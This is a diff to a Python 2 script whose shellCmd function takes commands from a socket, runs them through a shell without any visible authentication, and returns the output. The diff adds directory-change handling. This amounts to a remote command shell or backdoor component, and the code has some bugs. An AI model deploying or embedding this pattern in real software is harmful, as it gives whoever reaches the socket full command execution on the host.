@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import subprocess, sys, socket, os.path
+import subprocess, sys, socket, os
 
 
 def runCmd(args):
@@ -76,15 +76,36 @@ def shellCmd(args):
         cmd = conn.recv(1024)
 
         if cmd:
-            ps = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 
-            if ps:
-                out = str(ps.stdout.read())
-                conn.send(out)
+            cmdSplit = cmd.split()
+            if cmdSplit[0] == "cd":
+                out = ''
+                cd = ''.join(cmdSplit[1::])
+                try:
+                    subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, cwd=cd)
+                    os.chdir(cd)
+                except:
+                    out = 'no such direcotry'
 
             else:
+
+                ps = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+
+                out = str(ps.stdout.read())
                 err = str(ps.stderr.read())
-                conn.send(err)
+
+            if out:
+                    conn.send("%s" % out)
+
+            elif err:
+                print "in err"
+                conn.send('Error')
+
+            else:
+                print "in else"
+                conn.send('None')
+        else:
+            conn.send('None')
 
 
 def falseCmd(args):
